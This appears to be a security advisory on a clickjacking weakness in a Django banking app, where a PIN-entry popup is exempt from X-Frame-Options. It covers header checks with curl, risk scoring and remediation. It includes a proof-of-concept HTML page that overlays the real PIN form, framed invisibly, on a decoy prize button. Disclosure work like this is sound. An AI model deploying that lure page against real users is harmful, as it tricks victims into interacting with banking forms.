# Description

The bank PIN confirmation popup is served without clickjacking protection. `popup_action_view` in `Bank/views.py:69-73` is decorated with `@xframe_options_exempt` (imported at `Bank/views.py:11`), which tells Django's `XFrameOptionsMiddleware` to omit the `X-Frame-Options` header for that response. Standard banking pages return `X-Frame-Options: DENY` when accessed directly through Django. The popup is exempt from this protection, although additional framing restrictions may be enforced by the deployment infrastructure.

The endpoint is routed at `Bank/urls.py:52` as `payment/popup-action/<str:sid>` (mounted under `/banking/`, giving `GET /banking/payment/popup-action/<sid>`). It renders `payments/ask_pin.html`, the PIN entry form, so an attacker can frame the real PIN form and overlay a decoy UI on top of it.

This is **CWE-1021: Improper Restriction of Rendered UI Layers or Frames**. The application does not enforce Django's default framing protection on the sensitive PIN confirmation form. This may expose users to unintended interactions with the banking interface. However, the framing exemption alone does not demonstrate that the PIN can be retrieved by a third-party page.

The Docker Compose configuration also specifies the removal of framing-related security headers at the BunkerWeb reverse proxy level. Effective framing protection therefore depends on both the Django configuration and the deployment infrastructure.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Confirm the popup is frameable: `curl -sD - "http://localhost:8000/banking/dashboard/" -o /dev/null \| grep -i x-frame` | `X-Frame-Options: DENY` is returned on normal banking pages |
| 2 | Repeat against the popup: `curl -sD - "http://localhost:8000/banking/payment/popup-action/test123" -o /dev/null \| grep -i x-frame` | No `X-Frame-Options` header is returned, so the page can be framed |
| 3 | Host the PoC HTML (below) on an attacker-controlled origin, with the `<iframe>` `src` pointing at the real popup URL | The real PIN form loads inside an invisible iframe positioned over a decoy button |
| 4 | Lure an authenticated victim to the attacker page and have them click the decoy ("Claim your prize") | The click lands on the PIN input inside the transparent iframe, and the victim types their PIN into the real form |
| 5 | Assess the demonstrated security impact. | Unintended user interaction is a potential consequence of insufficient framing protection. PIN disclosure and unauthorised banking operations have not been demonstrated. |

The scenario described above illustrates the potential clickjacking risk. The browser's same-origin policy normally prevents a third-party page from reading the contents of a cross-origin iframe.

# PoC

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Claim your prize</title>
</head>
<body>
  <div style="position:relative; width:400px; height:300px;">
    <!-- Real PIN popup, framed without X-Frame-Options -->
    <iframe src="http://localhost:8000/banking/payment/popup-action/fakesid"
            style="opacity:0.01; position:absolute; top:0; left:0; width:400px; height:300px; z-index:2; border:0;">
    </iframe>

    <!-- Decoy UI shown to the victim -->
    <button style="position:absolute; top:50px; left:100px; z-index:1; padding:12px 24px;">
      Click here to claim your prize!
    </button>
  </div>
</body>
</html>
```

The iframe is nearly invisible (`opacity:0.01`) and sits above the decoy button (`z-index:2` vs `z-index:1`). Clicks on the button are delivered to the iframe, so the victim interacts with the real PIN field.

The original PoC illustrates the reported framing issue but does not demonstrate PIN disclosure.

Source code review confirms the framing exemption in `popup_action_view`. The reviewed POST handler returns a JSON success response without explicitly validating the PIN or communicating with the banking backend.

During local validation through direct access to Django on port 8000, `X-Frame-Options: DENY` was confirmed on the following pages:

- `/banking/dashboard/`
- `/banking/verification/`
- `/shop/payment/`

The effective response headers of the affected popup and the behaviour through BunkerWeb were not independently verified.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Potential exposure of the sensitive banking interface. Disclosure of the victim's bank PIN to an attacker has not been demonstrated. |
| Integrity | Potential unintended interactions with the banking interface. Unauthorised payments or transfers have not been demonstrated. |
| Availability | No direct impact. The attack does not disrupt service. |

Overall severity: **Medium** (original CVSS 3.1 score 4.7, vector `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N`). The attack requires user interaction (UI:R). The original CVSS assessment is retained for reference but remains provisional, as the claimed confidentiality and integrity impacts require further validation.

# Remediation

1. Remove `@xframe_options_exempt` from `popup_action_view` (`Bank/views.py:69`). The PIN popup should never be embeddable in a third-party frame.
2. Keep `X_FRAME_OPTIONS = 'DENY'` as the global Django default and do not override it on sensitive views. Use `SAMEORIGIN` only where same-origin framing is genuinely required.
3. Add `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) to sensitive responses as a modern complement to `X-Frame-Options`.
4. Review every view decorated with `@xframe_options_exempt` in the codebase, including `Chatbot/views.py:207`, and confirm that framing is required for each one. Views that handle credentials or money should not be exempt.
5. Consider a frame-busting check or a user-interaction confirmation step (re-entering the PIN on a same-origin page, or a visible confirmation dialog) for any credential entry, as defense in depth.
6. Ensure that the BunkerWeb reverse proxy preserves or enforces the required framing protection headers.

# Author
WOCSA
